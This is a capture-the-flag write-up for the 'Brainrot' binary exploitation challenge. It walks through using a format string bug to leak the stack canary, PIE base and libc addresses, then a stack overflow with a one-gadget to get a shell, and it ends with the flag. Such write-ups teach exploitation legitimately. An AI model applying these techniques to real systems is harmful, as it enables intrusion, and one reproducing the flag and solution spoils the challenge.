# Brainrot

Leaking address from got to get libc version, and using a one gadget to get a shell

Creator - [@PlatyPew](https://github.com/PlatyPew)

## Category

Binary Exploitation

## Question

> To enter the Skibidi Toilet, you must first prove that you are true sigma gyatt rizzler fanum tax (what am I even writing lol)
>
> Connect via `nc <ip address> 30000`

### Hint

- Use the format string vulnerability to bypass pie and stack canary
- Use the format string vulnerability to leak offsets for functions in libc
- Use the format string vulnerability to bypass aslr for libc
- How can you get a shell with a lack of gadgets and space

## Setup Guide

`docker compose up -d brainrot`

## Distribution

- brainrot: `0d3d5cf8077272c88c2afa6f06a71fea7daef44263bae829c5ec767f5db3dfe5`

## Solution

Use the Pwndbg plugin for GDB.

Run `checksec` to see that all protections have been enabled on this x86-64 binary.

```text
pwndbg> checksec
File:     /mnt/shared/CyberBlitz-2024-Challenges/Pwn/brainrot/distrib/brainrot
Arch:     amd64
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
Stripped:   No
```

Use IDA (or Ghidra) to decompile to binary.
Only the `vuln()` function is important.

```c
unsigned __int64 vuln() {
  char s[136]; // [rsp+0h] [rbp-90h] BYREF
  unsigned __int64 v2; // [rsp+88h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Enter your skibidi rizz name: ");
  fgets(name, 16, stdin);
  printf("Wow that's some fanum taxing you got there ");
  printf(name);
  puts("Gimme a rizz description of yourself");
  fgets(s, 161, stdin);
  return v2 - __readfsqword(0x28u);
}
```

The `name` variable is a global variable and has a size of 16 bytes.

```nasm
.bss:0000000000004030                 public name
.bss:0000000000004030 ; char name[16]
.bss:0000000000004030 name            db 10h dup(?)           ; DATA XREF: vuln+3D↑o
.bss:0000000000004030                                         ; vuln+60↑o
.bss:0000000000004030 _bss            ends
```

The `s` variable only has space allocated for 136 bytes but `fgets()` accepts 161 bytes.
This means that there is a stack overflow vulnerability.

The `name` variable is directly used with `printf()` which allows us to perform a format string exploit to leak values on the stack.

To begin, we first need to leak the canary and pie base.
Both addresses need to be leaked within the same `printf()` statement as the stack canary and pie base changes every time the binary is ran.
As we only have 16 characters (inclusive of the null-byte at the end), we need to be very conservative of how to leak both addresses at once.

Since the stack canary is stored on the stack, we can use a format string exploit to leak it.
To find the canary, let's use Pwndbg to print out the canary, then use a format string exploit to check which position on the stack it is located on.

```text
pwndbg> break vuln
Breakpoint 2 at 0x5555555551c0
pwndbg> run
...
pwndbg> canary
AT_RANDOM = 0x7fffffffc8b9 # points to (not masked) global canary value
Canary    = 0xb48e7527a706d800
Thread 1: Found valid canaries.
00:0000│-2e8 0x7fffffffc228 ◂— 0xb48e7527a706d800
Additional results hidden. Use --all to see them.
```

We can see that the canary is `0xb48e7527a706d800` (Do note that it will be different every time it runs).

Since the items on the stack mostly begin with `0x7fff`, we can slowly print out each item of the stack using `%1$p`, incrementing the number slowly to get the canary.

After trial an error, `%23$p` is where the canary is located.

```text
pwndbg> canary
Canary    = 0xb2c073e7eacbce00
pwndbg> continue
Continuing.
Enter your skibidi rizz name: %23$p
Wow that's some fanum taxing you got there 0xb2c073e7eacbce00
```

To find the pie base, find an address on the stack whilst ASLR off.
Get the difference between an address on the stack and the base address.

```text
pwndbg> aslr off
ASLR is OFF (show disable-randomization)
pwndbg> start
...
pwndbg> piebase
Calculated VA from ./brainrot = 0x555555554000
```

Similar to the canary, find an address on the stack that begins with `0x5555`.

After trial an error, `%25$p` gives an address that points to somewhere on the stack

```text
pwndbg> continue
Continuing.
Enter your skibidi rizz name: %25$p
Wow that's some fanum taxing you got there 0x555555555289
```

Subtract the address you have and the pie base address to get the offset.
`0x555555555289 - 0x555555554000 = 0x1289`

Run the binary again and try leaking both the stack canary and pie base

```text
$ ./brainrot
Enter your skibidi rizz name: %23$p|%25$p
Wow that's some fanum taxing you got there 0xf0ea515cc7a95a00|0x5641ce3ac289
```

Therefore the stack canary is `0xf0ea515cc7a95a00` and the pie base is `0x5641ce3ac289 - 0x1289 = 0x5641ce3ab000`

We have successfully defeated the stack canary and PIE protections.

Since we do not know what version of LIBC this binary is using, we need to leak some entries in the GOT.
We can make use of the format string exploit to leak the values.
However, the problem is the format string exploit only runs once, to bypass this, we can overwrite the return address of the vuln function to point back to itself, hence running the vulnerable printf line again.

Insert some padding of recognisable characters (such as 'A') at the beginning to make it easier to find with the format string exploit.
Place the GOT of 2 functions used (in this case, I'm using printf and puts).
Fill the remaining bytes with padding till we hit the stack canary.
Insert the stack canary we found earlier, and add more padding till we hit the return address.
Set the return address back to vuln using the pie base address.

```text
+---------+------------+----------+-----------+--------------+---------+----------------+
| Padding | PRINTF@GOT | PUTS@GOT | Padding   | Stack Canary | Padding | Vuln() Address |
| 8 bytes | 8 bytes    | 8 bytes  | 112 bytes | 8 bytes      | 8 bytes | 8 bytes        |
+---------+------------+----------+-----------+--------------+---------+----------------+
```

Using the format string exploit again, `%5$p` shows `0x4141414141414141`.
This means that `%6$p` is `PRINTF@GOT` and `%7$p` is `PUTS@GOT`.
To indirectly reference the address, use `%s` instead.

When sending a line, make sure not to send an additional `\n` as it will terminate the program before issuing the exploit sent.

Remember to pad it to 8 bytes long because printf stops printing after the first occurrence of a null-byte.

Now that we have 2 addresses, we can use libc database to find the libc this binary is using.

After getting libc, remember to patch the binary (you can use patchelf, but I prefer pwninit).

```bash
pwninit --no-template --bin ./brainrot --libc ./libc.so.6
```

Now to find the libc base.
Let's once again leak the stack canary and pie base, and overwrite the return address to point back to the vuln function.

Set a breakpoint at `vuln+4` after returning back to vuln and inspect the stack contents.

```text
pwndbg> stack
00:0000│ rbp rsp 0x7fffffffc458 ◂— 'AAAAAAAA'
01:0008│+008     0x7fffffffc460 ◂— 0
02:0010│+010     0x7fffffffc468 —▸ 0x155555335a90 (__libc_start_call_main+128) ◂— mov edi, eax
03:0018│+018     0x7fffffffc470 ◂— 0
04:0020│+020     0x7fffffffc478 —▸ 0x555555555271 (main) ◂— push rbp
05:0028│+028     0x7fffffffc480 ◂— 0x100000000
06:0030│+030     0x7fffffffc488 —▸ 0x7fffffffc578 —▸ 0x7fffffffc839 ◂— '/home/pwnpad/solution/brainrot_patched'
07:0038│+038     0x7fffffffc490 —▸ 0x7fffffffc578 —▸ 0x7fffffffc839 ◂— '/home/pwnpad/solution/brainrot_patched'
```

We can see that there is a value in the stack that reference an address in libc.
Using the format string exploit again, we find that this is located at `%26$p`.

The 26th value on the stack is `__libc_start_call_main+128`.
Subtract 128 from the leak to get the value of `__libc_start_call_main`.
Then subtract the offset of `__libc_start_call_main` from the libc base to get libc base.

Unfortunately, there isn't enough gadgets to build a full ROP chain, however, we can use a one-gadget and return to that address to get shell.

```text
0xe35a9 execve("/bin/sh", rbp-0x50, r13)
+----------+-------------------------------------------------------+
| Result   | Constraint                                            |
+==========+=======================================================+
| SAT      | address rbp-0x48 is writable                          |
+----------+-------------------------------------------------------+
| SAT      | r12 == NULL || {"/bin/sh", r12, NULL} is a valid argv |
+----------+-------------------------------------------------------+
| SAT      | [r13] == NULL || r13 == NULL || r13 is a valid envp   |
+----------+-------------------------------------------------------+
```

However, there are certain requirements required.

Upon completion of the stack pivot, the 8 byte value between the stack canary and the return address will become RBP.
Since the 2nd argument of execve() is rbp-0x50, we need to add 0x50 to the address of the global variable name so when it subtracts 0x50, it references the value of whatever is in name.
This allows the second argument of execve to be the address of the name variable.

```text
+-----------+--------------+------------------------+------------+
| Padding   | Stack Canary | Address of name + 0x50 | One Gadget |
| 136 bytes | 8 bytes      | 8 bytes                | 8 bytes    |
+-----------+--------------+------------------------+------------+
```

Send the exploit and get the flag.

### Flag

`CyberBlitz{you_are_the_alpha_wolf_and_your_level_10_gyatt_is_mewing_at_me}`
